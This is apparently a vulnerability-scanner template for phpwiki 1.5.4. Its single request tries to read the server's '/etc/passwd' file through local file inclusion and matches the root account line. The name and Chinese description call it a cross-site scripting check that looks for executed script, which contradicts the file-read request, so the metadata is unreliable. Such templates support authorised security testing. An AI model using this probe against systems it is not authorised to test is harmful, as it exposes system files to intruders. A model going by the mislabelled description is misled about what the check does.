id: phpwiki-lfi

info:
  name: phpwiki 1.5.4 - 跨站脚本漏洞
  author: 0x_Akoko
  severity: high
  description: phpwiki 1.5.4 - 跨站脚本/本地文件包含 存在跨站脚本漏洞。该模板通过构造恶意输入并检查响应回显或执行特征，验证目标是否会在浏览器上下文中执行注入脚本。
  reference:
    - https://www.exploit-db.com/exploits/38027
  metadata:
    max-request: 1
  tags: xss,edb,phpwiki,lfi,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/phpwiki/index.php/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0"

      - type: status
        status:
          - 200
